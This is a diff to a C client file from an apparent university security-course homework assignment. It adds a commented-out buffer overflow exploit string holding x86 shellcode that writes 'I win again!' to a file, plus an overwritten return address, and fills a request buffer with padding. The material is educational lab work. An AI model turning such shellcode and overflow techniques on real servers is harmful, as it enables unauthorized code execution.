@@ -1,4 +1,4 @@
-/* file: client3.c class: 18-732, Spring 2015, assignment: Homework 1
+/* file: client1.c class: 18-732, Spring 2015, assignment: Homework 1
 */
 
 /* Obligatory includes */
@@ -21,9 +21,24 @@
 
 
 int main(int argc, char** argv)
-{
-	char reqstring[1000] =
-		"IMG:abcd.jpg;LAT:57.64911;LON:10.40744;CAP:Good morning!";
+{	
+	/*
+	char reqstring[1000] =	"IMG:abcd.jpg;LAT:57.64911;LON:10.40744;CAP:Good morning!AAAA\xeb\x27\x31\xd2\x31\xc9\x31\xc0\x66\xba\x24\x01\xb1\x42\x5b\x83\x6b\x07\x01\xb0\x05\xcd\x80\x31\xd2\x31\xc9\xb2\x0c\x80\xc3\x08\x89\xd9\x89\xc3\xb0\x04\xcd\x80\xc3\xe8\xd4\xff\xff\xff\x66\x6f\x6f\x62\x61\x72\x2e\x74\x78\x74\x01\x49\x20\x77\x69\x6e\x20\x61\x67\x61\x69\x6e\x21";
+	int injectlen = 0;
+	while(injectlen<=804){
+		if(reqstring[injectlen] == 0){
+			reqstring[injectlen]='G';		
+		}	
+		injectlen++;
+	}
+	strcpy(&reqstring[805],"\xe0\xaf\x04\x08;");*/
+	char reqstring[1000] = "";
+	int k;
+	for (k = 0; k<=999; k++) {
+		if (reqstring[k] == 0) {
+			reqstring[k] = 'G';
+		}
+	}
 
 	int PORTNUM;
 	char SERVER_IP[16];
